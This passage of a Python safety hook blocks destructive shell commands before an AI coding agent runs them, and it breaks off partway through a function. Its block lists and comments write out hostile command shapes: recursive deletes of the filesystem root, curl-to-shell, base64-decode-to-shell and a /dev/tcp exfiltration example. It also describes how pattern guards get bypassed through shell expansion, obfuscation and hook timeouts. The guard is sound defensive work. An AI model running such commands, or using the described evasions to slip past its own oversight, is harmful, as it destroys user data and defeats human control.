# /// script
# requires-python = ">=3.10"
# ///
"""
PreToolUse Hook: Block dangerous commands before execution.
Deterministic safety — never rely on the LLM to avoid destructive ops.

Exit code 2 + JSON with decision:block stops the command.

Security Profile Aware:
- strict/standard: Blocks all dangerous patterns
- minimal: Only blocks catastrophic patterns (rm -rf /, fork bombs, etc.)

GuardFall hardening (SCOUT-20260715-1)
--------------------------------------
The Adversa AI "GuardFall" research (2026-06-30) showed pattern guards that
match the RAW command text are bypassed because bash rewrites the command via
expansion/quote-removal/substitution before executing it. A naive raw-substring
guard also OVER-blocks: `git commit -m "...rm -rf /..."`, `grep "rm -rf /"` are
data, not commands. So this hook:

  1. Canonicalizes with deterministic, FP-free transforms — $IFS expansion,
     quote removal, ANSI-C \\xHH/\\NNN escapes, cartesian brace expansion,
     echo/printf/rev/base64 substitution, and literal VAR= assignment.
  2. STRUCTURALLY MASKS each form — tokenizes into command segments and drops
     quoted multi-word DATA arguments (a dangerous string quoted as an argument
     to echo/grep/git-commit is not a command), while keeping everything for
     shell interpreters (bash -c "..." really does execute its argument).
  3. Matches a widened set of unambiguously destructive argv shapes and
     decoder/echo-to-shell pipelines across the masked forms.

This is a deterministic defense-in-depth backstop, NOT a sandbox. Runtime-only
obfuscation a pattern engine cannot resolve — parameter expansion (${x:-rm},
${!n}, ${A:0:2}), positional params ($1), unicode ANSI-C ($'\\u002f'), and
interpreter one-liners (perl/python -c decoding base64) — remains out of reach
of any pattern guard, exactly as the GuardFall research concludes. The real
defenses against a determined adversary who controls the command string are
architectural (don't feed untrusted input to a shell; sandbox/allowlist).
"""

import bisect
import fnmatch
import functools
import json
import posixpath
import re
import shlex
import signal
import sys
import threading
import time

# Import hook_config for profile-aware behavior
try:
    from hook_config import (
        get_exit_code,
        get_hook_behavior,
        get_max_command_length,
        get_reduced_patterns,
        is_enabled,
    )
except ImportError:
    # Fallback if hook_config not available
    def get_hook_behavior(hook_name: str) -> str:
        return "block"

    def get_exit_code(hook_name: str, issue_found: bool = True) -> int:
        return 2 if issue_found else 0

    def get_reduced_patterns(hook_name: str) -> list[str] | None:
        return None

    def is_enabled(hook_name: str) -> bool:
        return True

    def get_max_command_length() -> int:
        return 32 * 1024


# Auditing must never be able to block a tool call: if this import fails the
# hook still works, it just leaves no record.
try:
    from hook_audit import record_decision
except ImportError:

    def record_decision(*_args, **_kwargs):
        return False


HOOK_NAME = "block_dangerous"

# =============================================================================
# Destructive argv patterns (matched against structurally-masked canonical forms
# unless flagged raw-only). Every entry is unambiguously catastrophic.
# =============================================================================
# THE HOOK's verdict on a recursive rm comes from _rm_catastrophic_target()
# (defined below, near check_command), NOT from a regex. Which targets are
# catastrophic is a path judgement — scratch trees (/tmp, /private/tmp, $TMPDIR,
# /var/folders) and in-project paths are as survivable as a relative dirname,
# while the filesystem root, a bare glob, a whole system or home directory, and
# any `..` that escapes those are catastrophic in EVERY argument position. A
# single regex could not draw that line without the two rm patterns disagreeing
# with each other (the earlier `rm -rf /tmp/scratch` blocked / `rm -rf build
# /tmp/scratch` allowed split), and it could not normalise `..` at all.
#
# DANGEROUS_PATTERNS nevertheless keeps a COARSE catastrophic-rm regex, because
# it has two other consumers that read the list as plain regexes and cannot call
# the analyzer:
#
#   * .claude/hooks/company/operation_loop.py — validate_against_trust_tiers()
#     and get_trust_tier() run `re.search(p, command)` over every entry. Without
#     an rm entry, `rm -rf /` classifies as tier "free" and requires_gate is
#     False. That check is a GATE (route the task to a human), not a hard block,
#     so a coarse regex that over-blocks there is the safe direction.
#   * .claude/hooks/audit_exporter.py — exports the list as `forbidden_patterns`
#     in the compliance pack; a list with no rm rule misdescribes the control.
#
# The analyzer REFINES this regex rather than replacing it: the coarse entries
# below are listed in _COARSE_RM_PATTERNS and skipped by check_command, so the
# hook's own allow/deny decision stays with the analyzer while external
# consumers still see a rule for `rm -rf /`.
_RM_REC = r"(-[a-z]*r[a-z]*|--recursive)"  # short flag w/ r, or --recursive
_FLAG = r"(-[a-z-]+\s+)*"
# A token ends at whitespace, at end of string, or at a quote/shell delimiter.
_END = r"(?:\s|$|['\"();&|<>}])"
# Alternatives, in order: the filesystem root; a whole home directory; $HOME; a
# system directory; /var excluding the macOS temp tree; /private excluding
# /private/tmp; a whole user home (but not a path inside one); and a bare `*`.
_CATASTROPHIC_TARGET = (
    r"(?:"
    r"/"
    + _END
    + r"|~/?"
    + _END
    + r"|\$HOME/?"
    + _END
    + r"|/(?:etc|usr|bin|sbin|lib|boot|sys|dev|root|opt|System|Library|home)(?:/|"
    + _END
    + r")"
    + r"|/var(?!/folders)(?:/|"
    + _END
    + r")"
    + r"|/private(?!/tmp)(?:/|"
    + _END
    + r")"
    + r"|/Users/[^/\s]+/?"
    + _END
    + r"|\*"
    + _END
    + r")"
)
_COARSE_RM_PATTERNS = (
    # recursive rm with a catastrophic target in ANY argument position
    r"rm\s+" + _FLAG + _RM_REC + r"\b[^\n]*?\s" + _CATASTROPHIC_TARGET,
    r"rm\s+" + _FLAG + _RM_REC + r"\s+" + _FLAG + r"(--\s+)?" + _CATASTROPHIC_TARGET,
    r"rm\s+" + _FLAG + _RM_REC + r"\s+" + _FLAG + r"\.(\s|$)",  # bare cwd (not ./x)
    r"rm\s+" + _FLAG + _RM_REC + r"\s+(--\s+)?[\"']?\$[A-Za-z_{(]",  # rm -r $VAR/$( )
)

# sudo's own flags may sit between sudo and rm: `sudo -E rm`, `sudo -u root
# rm`, `sudo -- rm`. A flag may carry one non-dash argument (-u root). sudo
# is a shell-like head, so the structural mask keeps its argument quotes and
# `sudo "rm"` must match with the quote in place — that form passed BOTH the
# old `sudo\s+rm\b` and the rm rule (`rm"` is not `rm\s`). A path to the
# binary (`sudo /bin/rm`) is the same command. `sudo ls`, `sudo apt install
# x` and `sudo -u root ls` carry no rm and stay allowed; bare sudo is the
# permission layer's job, not this hook's (tests/test_docs_sudo_claim.py).
_SUDO_RM = r"sudo(\s+-\S+(\s+[^-\s]\S*)?)*\s+['\"]?(\S*/)?rm\b"

DANGEROUS_PATTERNS = [
    *_COARSE_RM_PATTERNS,
    r"rm\s+[^\n]*--no-preserve-root\b",
    _SUDO_RM,
    r"chmod\s+(-R\s+|--recursive\s+)?0*777\b",
    r"chmod\s+(-R|--recursive)\s+0*[0-7]{3}\s+[/~](\s|$)",
    r"chown\s+(-R|--recursive)\s+\S+\s+[/~](\s|$)",
    r"mkfs(\.\w+|\s+-t\s+\w+)?\s+/?dev/",
    r"\bdd\b[^\n]*\bof=/dev/(sd|disk|nvme|rdisk|hd|vd|xvd|mmcblk|loop|md)",
    r">\s*/dev/(sd|disk|nvme|rdisk|hd|vd|xvd|mmcblk|loop|md)",
    r"(cat|cp)\b[^\n]*>\s*/dev/(sd|disk|nvme|rdisk|hd|vd|xvd|mmcblk)",
    r"\bshred\b[^\n]*(/dev/|\s[/~](\s|$))",
    r"\bwipefs\b\s+-a",
    r"mv\s+[/~]\S*\s+/dev/null\b",
    # bash's /dev/tcp and /dev/udp pseudo-devices open a socket when used as
    # a redirection target: `cat notes.md > /dev/tcp/HOST/PORT` exfiltrates a
    # file with no curl or wget for the egress guard to resolve. The devices
    # exist only inside bash's redirection code (open(2) cannot open them),
    # so the rule is anchored to a redirection operator; a bare mention —
    # `grep -rn "/dev/tcp" .`, `grep /dev/tcp docs/x.md` — is data and passes.
    r"[<>]\s*/dev/(tcp|udp)/",
    r"curl[^\n]*\|\s*(ba|z|c|k|da)?sh\b",
    r"wget[^\n]*\|\s*(ba|z|c|k|da)?sh\b",
    r"git\s+push\s+(-f|--force)\s+(origin\s+)?(main|master)\b",
    r"git\s+push\s+(origin\s+)?(main|master)\s+(-f|--force)\b",
    r"git\s+reset\s+--hard\b",
    r":\(\)\s*\{[^\n]*\|[^\n]*&\s*\}\s*;\s*:",
    r"echo\s+[^\n]*>\s*/etc/",
    r"\bnpm\s+publish\b(?!\s+--dry-run)",
    # ORM schema-reset commands. Repeatedly reported (anthropics/claude-code
    # #34729, #36183) wiping live production databases inside autonomous
    # sessions — one case dropped all 22 tables about ten minutes in, with no
    # confirmation anywhere in the chain. These take no quoted SQL, so the
    # structural mask keeps them intact and they need no raw form.
    r"\bprisma\s+migrate\s+reset\b",
    r"\bprisma\s+db\s+push\b[^\n]*--force-reset\b",
]

# Destructive SQL handed to a database client. These MUST match the raw form:
# _structural_mask drops quoted multi-word arguments, which is exactly what
# keeps `grep "DROP DATABASE" schema.sql` safe, but it also erases the
# statement here. Anchoring each pattern to a client binary AND its
# execute flag restores that safety on the raw form — `grep`, `echo` and
# `git commit -m` carry no `psql -c` / `mysql -e` / `mongosh --eval`.
_DB_CLIENT = r"(psql|mysql|mariadb|mongosh|mongo)"
_DB_EXEC_FLAG = r"(-c|-e|--command|--execute|--eval)"

DANGEROUS_PATTERNS.append(
    r"\b" + _DB_CLIENT + r"\b[^\n]*\s" + _DB_EXEC_FLAG + r"\b[^\n]*\bdrop\s+database\b"
)
DANGEROUS_PATTERNS.append(
    r"\b" + _DB_CLIENT + r"\b[^\n]*\s" + _DB_EXEC_FLAG + r"\b[^\n]*\btruncate\s+table\b"
)
DANGEROUS_PATTERNS.append(r"\b(mongosh|mongo)\b[^\n]*--eval\b[^\n]*\bdropDatabase\s*\(")

# find rooted at a CATASTROPHIC location + a destructive action. Bare /, system
# dirs, $HOME only — so `find . -exec rm`, `find ~/.cache -delete`,
# `find ~ -name x -delete`, `find /tmp/x -delete` all pass.
_FIND_ROOT = (
    r"(/(etc|usr|bin|lib|var|boot|sys|dev|System|Library|home|root|opt|sbin|private)\b"
    r"|/(\s|$)|\$HOME(\s|$))"
)
DANGEROUS_PATTERNS.append(
    r"find\s+(-[a-z]+\s+)*"
    + _FIND_ROOT
    + r"[^\n]*(-delete\b|-exec(dir)?\s+(rm|shred|dd|truncate|unlink|mkfs)\b)"
)
DANGEROUS_PATTERNS.append(r"cd\s+/\s*&&[^\n]*find\s+\.[^\n]*-delete\b")

SENSITIVE_PATH_PATTERNS = [
    r"/etc/passwd",
    r"/etc/shadow",
    r"~/.ssh/",
    r"~/.aws/",
    r"\.env($|\s)",
    r"credentials\.json",
    r"\.pem$",
    r"\.key$",
]

_DECODER = (
    r"(base64\s+(-d|--decode|-D)|xxd\s+(-r|-p\s+-r|-r\s+-p)|openssl\s+enc[^\n]*-d"
    r"|base32\s+-d|uudecode|curl\b|wget\b)"
)
_SHELL = r"(ba|z|c|k|da)?sh\b"
OBFUSCATION_PATTERNS = [
    _DECODER + r"[^\n]*\|\s*(\w[^\n|]*\|\s*)*" + _SHELL,
    _SHELL + r"\s+-c\s+[\"']?[$`]\(?[^\n]*" + _DECODER,
    _SHELL + r"\s+<\(\s*" + _DECODER,
    r"(source|\.)\s+<\(\s*" + _DECODER,
    _SHELL + r"\s+<<<\s*[\"']?[$`]\(?[^\n]*" + _DECODER,
    r"\bxxd\s+-p\s+-r\s+<<<[^\n]*\|\s*" + _SHELL,
    # eval of a FETCH/DECODE substitution (executes remote/encoded code). Scoped
    # to curl/wget/base64/xxd so legit `eval $(pyenv init -)` is NOT blocked.
    r"eval\s+[\"']?[$`]\(?\s*(curl|wget|base64|xxd|base32|openssl\s+enc)\b",
]

# =============================================================================
# Deterministic, false-positive-free canonicalizations
# =============================================================================
_IFS_RE = re.compile(r"\$\{IFS[^}]*\}|\$IFS\b")
_EMPTY_QUOTES_RE = re.compile(r"''|\"\"")
_ANSI_C_RE = re.compile(r"\$'([^']*)'")
_SUBST_RE = re.compile(
    r"\$\(\s*(echo|printf|rev|base64)\s+([^)]*)\)"
    r"|`\s*(echo|printf|rev|base64)\s+([^`]*)`"
)
_HERESTR_RE = re.compile(
    r"\$\(\s*(rev|base64)\s+(?:-d\s+|--decode\s+)?<<<\s*([^)]*)\)"
    r"|`\s*(rev|base64)\s+(?:-d\s+|--decode\s+)?<<<\s*([^`]*)`"
)
# A newline separates commands exactly as `;` does: `x=rm` on line 1 binds `$x`
# on line 2, and `x=curl` on line 1 binds `$x …` on line 2 for the egress guard.
#
# The VALUE is substitution-aware. Capturing it as `[^\s;&|]+` bound
# `d=$(git rev-parse --show-toplevel)` to the fragment `$(git`, and _resolve_vars
# then spliced that fragment into the later `git -C "$d" push -u origin feat/x`
# — whose masked form read like a bare `git push` with no remote, so the egress
# guard could not resolve a destination and hard blocked the daemon's own push
# (2026-09-05). A `$(...)` (nesting bounded to three levels) or a backtick
# group is now one value; anything deeper is captured unbalanced and
# _resolve_vars leaves the variable alone rather than splice a fragment.
_PAREN_D1 = r"\([^()]*\)"
_PAREN_D2 = r"\((?:[^()]|" + _PAREN_D1 + r")*\)"
_PAREN_D3 = r"\((?:[^()]|" + _PAREN_D2 + r")*\)"
_SUBST_VALUE = r"\$" + _PAREN_D3 + r"|`[^`]*`"
# The gap after the separator is `[^\S\n]*` (whitespace EXCEPT newline), not
# `\s*`: `\s*` crossed newlines, so on a run of N newlines every `\n` start
# scanned the rest of the run before failing — findall was O(N^2), ~28 s for
# `"\n" * 32766 + "ls"` (2026-09-25), past Claude Code's hook timeout, and a
# timed-out hook is non-blocking. The captures are unchanged: an assignment
# after `;\n` or `\n\n` is still found, from the last newline instead.
#
# Every assignment word is read, not only the first: `A=1 x=rm; $x -rf /`
# bound only `A`, so `$x` stayed unresolved and the delete passed. A run of
# words after the first is read by _ASSIGN_NEXT_RE from where the previous
# word ended, and a declaration builtin in front (`export x=rm`, `local -r
# x=rm`) is skipped (2026-10-18, third challenger review of #735).
# A flag group holding `n` is NOT skipped: `declare -n y=x` makes `y` a
# reference to `x`, not the text `x`, so it stays unread (and an unread
# assignment of a name in command position blocks).
_DECL_PREFIX = (
    r"(?:(?:export|local|declare|typeset|readonly)"
    r"(?:[^\S\n]+-[A-Za-mo-z]+)*[^\S\n]+)?"
)
_ASSIGN_RE = re.compile(
    r"(?:^|[;&|\n])[^\S\n]*"
    + _DECL_PREFIX
    + r"([A-Za-z_]\w*)=((?:"
    + _SUBST_VALUE
    + r"|[^\s;&|])+)"
)
_ASSIGN_NEXT_RE = re.compile(
    r"[^\S\n]+([A-Za-z_]\w*)=((?:" + _SUBST_VALUE + r"|[^\s;&|])+)"
)


@functools.lru_cache(maxsize=8)
def _assignment_words(s: str) -> tuple[tuple[int, str, str], ...]:
    """Every NAME=value word of every assignment run, as (offset of NAME,
    NAME, value), in text order. Each character is consumed by at most one
    match, so this is linear in the text. Cached: one tool call reads the
    same texts from both hooks and from several passes."""
    out: list[tuple[int, str, str]] = []
    for m in _ASSIGN_RE.finditer(s):
        out.append((m.start(1), m.group(1), m.group(2)))
        pos = m.end()
        while True:
            nxt = _ASSIGN_NEXT_RE.match(s, pos)
            if nxt is None:
                break
            out.append((nxt.start(1), nxt.group(1), nxt.group(2)))
            pos = nxt.end()
    return tuple(out)


def _substitutions_balanced(value: str) -> bool:
    """False when a captured value holds an unclosed `$(` or a lone backtick
    (a substitution deeper than _ASSIGN_RE follows, or one whose body has a
    quoted paren): splicing such a fragment produces a form the shell never
    sees, so the assignment is skipped instead."""
    if "$(" not in value and "`" not in value:
        return True
    depth = 0
    for ch in value:
        if ch == "(":
            depth += 1
        elif ch == ")":
            depth -= 1
            if depth < 0:
                return False
    return depth == 0 and value.count("`") % 2 == 0


# Builtins that run another command: `builtin eval 'rm -rf /'` runs the delete,
# so a `builtin` segment naming one of these is shell-like and keeps its
# quoted argument. `builtin` itself is NOT in _SHELL_LIKE: `builtin echo "rm
# -rf /"` and `builtin cd 'a dir'` stay masked data, as they are without the
# prefix (2026-09-26 challenger on #660).
_BUILTIN_RUNNERS = frozenset({"eval", "exec", "command"})


def _builtin_runs_command(toks: list[str]) -> bool:
    """Whether a segment whose head is `builtin` runs another command.

    bash's `builtin` skips one leading `--` before the builtin's name; a chain
    `builtin builtin …` is followed to the first name that is not `builtin`."""
    i = 0
    while i < len(toks) and toks[i].lower().rsplit("/", 1)[-1] == "builtin":
        i += 1
        if i < len(toks) and toks[i] == "--":
            i += 1
        if i < len(toks) and toks[i].lower() in _BUILTIN_RUNNERS:
            return True
    return False


_SHELL_LIKE = {
    "sh",
    "bash",
    "zsh",
    "dash",
    "ksh",
    "csh",
    "tcsh",
    "eval",
    "exec",
    "source",
    ".",
    "xargs",
    "env",
    "nohup",
    "timeout",
    "watch",
    "sudo",
    "su",  # `su -c '<cmd>'` executes <cmd> — keep its argument, like sh -c
    "command",
    "nice",
    "setsid",
    "stdbuf",
    "script",
    "ssh",
    "perl",
    "python",
    "python3",
    "ruby",
    "node",
    "php",
    "awk",
    # Wrappers and string evaluators that were missing (2026-10-18). The mask
    # no longer depends on this list (it masks only _DATA_HEADS); these feed
    # the "any token names an interpreter" rule in _segment_is_inert_data,
    # e.g. `echo "…" | ionice sh` keeps the echo.
    "fish",
    "pwsh",
    "osascript",
    "parallel",
    "expect",
    "tclsh",
    "lua",
    "rscript",
    "tmux",
    "screen",
    "doas",
    "pkexec",
    "runuser",
    "sg",
    "ionice",
    "caffeinate",
    "chrt",
    "taskset",
    "flock",
    "unbuffer",
    "gtimeout",
    "nsenter",
    "chroot",
    "busybox",
    "time",
}

# Commands whose quoted multi-word arguments are DATA (a message, a search
# pattern, a file name) and which never evaluate an argument as code. ONLY a
# segment headed by one of these — the bare name, nothing in front of it — is
# masked. Everything else keeps its quoted arguments and is checked: an
# assignment (`X=1`), a redirection (`>/dev/null`), a subshell or group (`(`,
# `{`), a control word (`if`, `!`, `time`), any wrapper (`ionice`, `flock`)
# and any CLI that runs a string (`nix-shell --run`, `watchexec`, `npm exec
# -c`). Deciding the other way round — mask unless the head is a KNOWN
# interpreter — is what let every unlisted prefix hide `bash -c '…'`
# (2026-10-18). An allowlist fails closed: a missing entry is a false
# positive, never a bypass.
_DATA_HEADS = frozenset(
    {
        "echo",
        "printf",
        "grep",
        "egrep",
        "fgrep",
        "rg",
        "ag",
        "ack",
        "cat",
        "head",
        "tail",
        "wc",
        "ls",
        "touch",
        "mkdir",
        "cd",
        "pwd",
        "test",
        "[",
        "true",
        "false",
        ":",
        "diff",
        "file",
        "stat",
        "basename",
        "dirname",
        "realpath",
        "sort",
        "uniq",
        "cut",
        "tr",
        "jq",
        "which",
        "printenv",
        "read",
    }
)
# git subcommands whose multi-word arguments are messages, patterns or paths.
# Not listed (kept and checked): rebase (`--exec`), bisect (`run`), submodule
# (`foreach`), filter-branch, config, fetch/pull/push (`--upload-pack`,
# `--receive-pack` run a local command), difftool. `grep` is listed, and
# its pager option (`-O<pager>` / `--open-files-in-pager`) is refused by
# _GIT_RUNS_PROGRAM.
_GIT_DATA_SUBCOMMANDS = frozenset(
    {
        "commit",
        "grep",
        "tag",
        "log",
        "show",
        "status",
        "add",
        "checkout",
        "switch",
        "branch",
        "merge",
        "stash",
        "notes",
        "diff",
        "restore",
        "mv",
        "rm",
        "ls-files",
        "rev-parse",
        "blame",
        "shortlog",
        "describe",
    }
)
# gh command groups whose multi-word arguments are titles and bodies. Not
# listed: alias (`--shell`), api, extension, codespace.
_GH_DATA_GROUPS = frozenset({"pr", "issue", "release", "label", "repo"})

# git options that run a program, or load one from config/env. Any token
# starting with one of these refuses masking, whatever the subcommand.
_GIT_RUNS_PROGRAM = (
    "--config-env",
    "--exec",
    "--ext-diff",
    "--upload-pack",
    "--receive-pack",
    "--textconv",
    "--open-files-in-pager",
    "-O",
)
# git options whose value is TEXT to match or print, never run: a multi-word
# value of one of these is data (`git log --grep="git reset --hard"`), not
# the command line the keyed-value rule refuses. Honoured only once the head
# is an allowlisted git data subcommand.
_GIT_TEXT_OPTION_RE = re.compile(
    r"(?:--grep|--author|--committer|--format|--pretty|--message)=|-[SG]"
)


def _git_subcommand_is_data(toks: list[str]) -> bool:
    """`git [global options] <subcommand>` with a data-only subcommand.

    `-C <dir>` and `-c <key=value>` skip their argument (a multi-word `-c`
    value — a command line — is refused by the keyed-value rule in
    _segment_is_inert_data); any other option is skipped as a flag. A
    misread option VALUE becomes the "subcommand", which is then not in the
    list — so a misread keeps the segment, never masks it. A token naming
    an option that runs a program (_GIT_RUNS_PROGRAM) refuses anywhere."""
    if any(t.startswith(_GIT_RUNS_PROGRAM) for t in toks[1:]):
        return False
    i = 1
    while i < len(toks) and toks[i].startswith("-"):
        i += 2 if toks[i] in ("-C", "-c") else 1
    return i < len(toks) and toks[i] in _GIT_DATA_SUBCOMMANDS


def _head_is_data_command(toks: list[str]) -> bool:
    i = 0
    # `builtin echo "…"` is echo; `builtin eval '…'` is not in the list.
    while i < len(toks) and toks[i] == "builtin":
        i += 1
        if i < len(toks) and toks[i] == "--":
            i += 1
    if i >= len(toks):
        return False
    head = toks[i]
    if head == "git":
        return _git_subcommand_is_data(toks[i:])
    if head == "gh":
        return i + 1 < len(toks) and toks[i + 1] in _GH_DATA_GROUPS
    return head in _DATA_HEADS


# Command/process substitution: the shell runs it even inside a double-quoted
# "data" argument (`echo "$(rm -rf /)"`). shlex loses the quoting, so any
# token carrying one keeps its segment whole.
_SUBSTITUTION_MARKERS = ("$(", "`", "<(", ">(")
# A function or alias defined anywhere in the command can turn a plain-looking
# later head (`f 'rm -rf /'`) into a shell runner: no segment of such a
# command is masked.
_DEFINES_RUNNER_RE = re.compile(r"\w\s*\(\s*\)|\bfunction\s|\balias\s")
# A multi-word `name=value` / `--opt=value` argument is often a command line
# handed to the program: `git -c core.pager="rm -rf /" log`, `git -c
# alias.x='!sh …'`, `--ssh-command="…"`. Not provably data: kept.
_KEYED_VALUE_RE = re.compile(r"-*[A-Za-z_][\w.-]*=")


def _binds_variable(toks: list[str]) -> bool:
    """A data head that stores its quoted argument in a variable — `printf -v
    c "rm -rf /"`, `read x <<< "…"`, `mapfile` — so a later `eval "$c"` runs
    the "data" (see the binds/expands rule in _structural_mask)."""
    i = 0
    while i < len(toks) and toks[i] in ("builtin", "--"):
        i += 1
    if i >= len(toks):
        return False
    head = toks[i]
    if head in ("read", "mapfile", "readarray"):
        return True
    return head == "printf" and any(t.startswith("-v") for t in toks[i + 1 :])


def _segment_is_inert_data(toks: list[str]) -> bool:
    """Whether a segment's quoted multi-word arguments may be dropped.

    Fail-safe by construction: True only when the segment's FIRST token is a
    data-only command (_DATA_HEADS, or a data git/gh subcommand) — no prefix
    of any kind; when no token names a shell or string evaluator
    (`echo x | xargs sh -c`, `git log bash -c …`); when no multi-word token is
    a keyed value; and when no token holds a substitution. Everything else
    is kept and checked. The prefix is never parsed: the question is only
    whether masking is provably safe, and a false positive is the accepted
    cost of "no".
    """
    if not _head_is_data_command(toks):
        return False
    is_git = toks[0] == "git"  # an allowlisted git data subcommand, by now
    for t in toks[1:]:
        if " " in t or "\t" in t:
            # A multi-word token is never a command name; it is the data the
            # mask drops — unless it is a keyed value (see _KEYED_VALUE_RE),
            # other than a git text-matching option's value.
            if _KEYED_VALUE_RE.match(t) and not (
                is_git and _GIT_TEXT_OPTION_RE.match(t)
            ):
                return False
            continue
        name = t.lower().rsplit("/", 1)[-1]
        # `.` as an argument is a path (`grep -r "x" .`), not `source`.
        if name != "." and name in _SHELL_LIKE:
            return False
    return not any(m in t for t in toks for m in _SUBSTITUTION_MARKERS)


def _strip_q(a: str) -> str:
    a = a.strip()
    return a[1:-1] if len(a) >= 2 and a[0] in "'\"" and a[-1] == a[0] else a


def _hexoct(s: str) -> str:
    s = re.sub(r"\\x([0-9A-Fa-f]{2})", lambda h: chr(int(h.group(1), 16)), s)
    s = re.sub(r"\\([0-7]{1,3})", lambda o: chr(int(o.group(1), 8)), s)
    return s.replace("\\n", " ").replace("\\t", " ").replace("\\r", " ")


def _decode_ansi_c(s: str) -> str:
    return _ANSI_C_RE.sub(lambda m: _hexoct(m.group(1)), s)


class _AnalysisTooComplex(Exception):
    """Raised when canonicalizing a command would do disproportionate work
    for its input size. Callers of check_command() must catch this and fail
    CLOSED (block) rather than let the analysis run long enough to risk the
    hook being killed at its timeout — a killed PreToolUse hook is
    non-blocking, so a timeout is equivalent to passing every check open."""


class _AnalysisDeadline(BaseException):
    """Raised by the SIGALRM handler main() arms when the analysis outlives
    its wall-clock budget. A BaseException on purpose: the analyzers and the
    audit writer have `except Exception` fallbacks (the hard-reset analyzer's
    "an analyzer bug must not end the hook", hook_audit's "never let auditing
    break a tool call") that would swallow it and lose the verdict. Only the
    two check_command()s and main() catch it, and all three block."""


# Total brace-expansion items (summed across all rounds) a single command may
# produce. A command well under the top-level size cap can still spell out a
# comma list with hundreds of entries; this is a second, independent bound —
# see _AnalysisTooComplex.
_MAX_BRACE_EXPANSION_ITEMS = 256

# The item count above bounds how many PIECES an expansion has, not how many
# BYTES it produces: each piece carries the whole surrounding word, so 256
# items around a 14KB word is a 7.2MB form built from a 30KB command that
# passed the input cap. Measured 2026-09-05 on the version that had only the
# item cap: a 29,287-byte command (brace wings + assignments + a fetch of a
# non-allowlisted host) still ran past Claude Code's 60s hook timeout, and a
# killed PreToolUse hook is non-blocking — the exact fail-open the input cap
# was added to close. The bounds below cap the WORK, not just the input:
#   * expanded text per form            -> the input cap itself
#   * number of canonical forms         -> _MAX_CANONICAL_FORMS
#   * summed length of all forms        -> _CANONICAL_TOTAL_CAP_FACTOR x cap
#   * variables _resolve_vars rewrites  -> _MAX_RESOLVED_VARS
# Every one of them fails CLOSED through _AnalysisTooComplex -> block.
_MAX_CANONICAL_FORMS = 16
_CANONICAL_TOTAL_CAP_FACTOR = 4
_MAX_RESOLVED_VARS = 64
_RESOLVE_PASSES = 3
# Earlier-value readings of reassigned variables (_build_canonical_forms).
_MAX_EXTRA_PICKS = 3

# `{...,...}` only: the match MUST start on this literal, so Python's re
# engine can fast-scan between `{` occurrences instead of trying a full
# match-or-fail at every character offset in the string. The previous pattern
# — `([^\s{}]*)\{([^{}]*,[^{}]*)\}([^\s{}]*)` — put a variable-length group
# before the required `{`, which defeats that optimization: on a command with
# no matching brace expansion (the common case — including ordinary
# `${VAR}`-style substitutions, which have a `{` but no comma), every start
# position had to be tried and each failed attempt backtracked across the
# rest of the string. Measured: a 32KB comment with no braces at all cost
# 13.4s in this one regex (cProfile, 2026-09-05) — quadratic in length.
_BRACE_RE = re.compile(r"\{([^{}]*,[^{}]*)\}")


def _brace_word_char(ch: str) -> bool:
    return not ch.isspace() and ch not in "{}"


def _expand_braces(s: str, max_len: int | None = None) -> str:
    """Expand `{a,b}` groups, bounded both by item COUNT and by the resulting
    text LENGTH. ``max_len`` defaults to the configured command-size cap: an
    expansion may not produce more text than a command is allowed to contain
    in the first place, so the analysis downstream of it stays bounded by the
    same number the input is."""
    if "{" not in s:
        return s
    if max_len is None:
        max_len = get_max_command_length()
    total_items = 0
    for _ in range(6):
        m = _BRACE_RE.search(s)
        if not m:
            break
        start, end = m.start(), m.end()
        pre_start = start
        while pre_start > 0 and _brace_word_char(s[pre_start - 1]):
            pre_start -= 1
        post_end = end
        while post_end < len(s) and _brace_word_char(s[post_end]):
            post_end += 1
        pre, post = s[pre_start:start], s[end:post_end]
        parts = m.group(1).split(",")
        total_items += len(parts)
        if total_items > _MAX_BRACE_EXPANSION_ITEMS:
            raise _AnalysisTooComplex(
                f"brace expansion exceeds {_MAX_BRACE_EXPANSION_ITEMS} items"
            )
        # Project the size BEFORE building the string: each part carries the
        # whole surrounding word, so a 256-item group around a 14KB word is
        # 7.2MB. Computing the length costs a sum over the parts; building it
        # costs the megabytes, and everything downstream then rescans them.
        wings = len(pre) + len(post)
        expansion_len = sum(len(p) + wings for p in parts) + len(parts) - 1
        projected = len(s) - (post_end - pre_start) + expansion_len
        if projected > max_len:
            raise _AnalysisTooComplex(
                f"brace expansion would produce {projected} characters, "
                f"over the {max_len}-character analysis bound"
            )
        expansion = " ".join(pre + p + post for p in parts)
        s = s[:pre_start] + expansion + s[post_end:]
    return s


def _b64(text: str):
    import base64
    import binascii

    try:
        return base64.b64decode(text, validate=True).decode("utf-8", "replace")
    except (binascii.Error, ValueError):
        return None


def _resolve_subst(s: str) -> str:
    def herestr(m):
        op = m.group(1) or m.group(3)
        blob = _strip_q(m.group(2) if m.group(2) is not None else m.group(4))
        if op == "rev":
            return blob[::-1]
        dec = _b64(blob)
        return dec if dec is not None else m.group(0)

    def sub(m):
        cmd = m.group(1) or m.group(3)
        arg = _strip_q((m.group(2) or m.group(4) or "").strip())
        if cmd in ("echo", "printf"):
            return _hexoct(arg)
        if cmd == "rev":
            return arg[::-1]
        dec = _b64(arg)
        return dec if dec is not None else m.group(0)

    prev = None
    for _ in range(4):
        if s == prev:
            break
        prev = s
        s = _HERESTR_RE.sub(herestr, s)
        s = _SUBST_RE.sub(sub, s)
    return s


def _resolve_vars(s: str, max_len: int | None = None, pick: int | None = None) -> str:
    """Splice assigned values into their later uses.

    Two full-string ``re.sub`` run per DISTINCT variable, so the cost is
    O(variables x length) — a command that binds a few thousand names (they
    fit easily under the input cap) turns every form into thousands of full
    rescans. ``_MAX_RESOLVED_VARS`` bounds the multiplier and the growth check
    bounds the result; both fail closed.

    By default the last assignment of a name wins. ``pick=i`` splices the
    i-th DISTINCT value of each name instead (clamped to its last), so the
    caller can read the command once per value a reassigned variable takes
    (`x=main; git push --force origin $x; x=feat`). A variable that names
    the command is judged by _var_command_word, not by these readings."""
    words = _assignment_words(s)
    if pick is None:
        assignments = {k: v for _pos, k, v in words}
    else:
        values: dict[str, list[str]] = {}
        for _pos, k, v in words:
            seen = values.setdefault(k, [])
            if v not in seen:
                seen.append(v)
        assignments = {k: vs[min(pick, len(vs) - 1)] for k, vs in values.items()}
    if not assignments:
        # Nothing to splice. Returning before the config read matters: the
        # egress guard calls this once per substitution body / shell string,
        # and reading gatesmith.json twice per call made a cap-sized run
        # of `$(a)` take ~11 s (2026-09-25).
        return s
    if max_len is None:
        max_len = get_max_command_length()
    if len(assignments) > _MAX_RESOLVED_VARS:
